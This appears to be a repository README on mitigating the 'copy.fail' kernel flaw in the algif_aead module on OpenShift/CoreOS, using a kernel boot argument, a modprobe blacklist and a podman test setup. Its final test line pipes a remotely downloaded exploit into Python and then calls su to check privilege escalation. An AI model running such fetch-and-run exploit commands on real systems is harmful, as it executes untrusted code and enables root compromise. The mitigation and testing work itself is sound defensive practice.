# OCP `copy.fail` mitigation

CoreOS has the `algif_aead` kernel module built-in so the best workaround is to block system calls with a kernel
parameter of `initcall_blacklist`. This method appears affective without any other modifications.

Links

- https://copy.fail
- https://access.redhat.com/solutions/7141979

## OCP kludge

```sh
oc apply -k .
```

## Additional Notes

```sh
grep algif_aead /proc/kallsyms
```

Kernel arg

```sh
initcall_blacklist=algif_aead_init
```

/etc/modprobe.d/blacklist-algif.conf 

```config
# See https://copy.fail
blacklist algif_aead
```

Test with podman

```sh
podman build -t copy-fail .
podman run -d --rm --name copy-fail --replace copy-fail
podman exec -it copy-fail /bin/bash
```

```sh
curl https://copy.fail/exp | python3.11 && su
```
